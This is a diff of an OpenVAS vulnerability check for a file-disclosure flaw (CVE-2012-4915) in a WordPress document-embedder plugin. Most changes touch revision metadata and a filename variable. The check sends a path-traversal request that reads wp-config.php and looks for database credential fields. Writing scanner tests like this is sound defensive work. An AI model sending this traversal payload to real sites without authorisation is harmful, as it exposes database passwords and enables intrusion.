@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_57133.nasl 11007 2018-08-16 13:20:25Z mmartin $
+# $Id: gb_wordpress_57133.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # WordPress Google Doc Embedder Plugin Arbitrary File Disclosure Vulnerability
 #
@@ -34,14 +34,14 @@ if (description)
   script_cve_id("CVE-2012-4915");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_version("$Revision: 11007 $");
+  script_version("$Revision: 11497 $");
 
   script_name("WordPress Google Doc Embedder Plugin Arbitrary File Disclosure Vulnerability");
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57133");
   script_xref(name:"URL", value:"http://www.wordpress.org/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-16 15:20:25 +0200 (Thu, 16 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2013-01-08 14:00:15 +0100 (Tue, 08 Jan 2013)");
 
   script_category(ACT_ATTACK);
@@ -69,16 +69,18 @@ Google Doc Embedder 2.4.6 is vulnerable, other versions may also be affected.");
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
+vtstring = get_vt_string( lowercase:TRUE );
 if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
 
 if (dir == "/")
   dir = "";
 
-openvas = 'openvas_' + rand() + '.pdf';
+filename = vtstring +'_' + rand() + '.pdf';
 
-url = dir + '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=' + openvas  + '&file=../../../../wp-config.php';
+url = dir + '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=' + filename  + '&file=../../../../wp-config.php';
 
 if(http_vuln_check(port:port, url:url,pattern:"DB_NAME",extra_check:make_list("DB_USER","DB_PASSWORD","DB_HOST"))) {
 
